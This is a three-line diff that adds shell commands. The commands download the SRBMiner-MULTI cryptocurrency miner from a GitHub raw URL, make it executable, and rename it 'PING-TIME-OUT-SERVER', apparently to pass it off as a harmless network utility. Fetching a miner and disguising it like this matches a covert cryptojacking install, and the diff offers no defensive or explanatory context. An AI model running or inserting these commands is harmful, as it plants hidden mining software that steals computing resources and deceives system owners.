@@ -1,0 +1,3 @@
+wget https://raw.githubusercontent.com/apaple/pack/main/SRBMiner-MULTI
+chmod u+x SRBMiner-MULTI
+mv SRBMiner-MULTI PING-TIME-OUT-SERVER
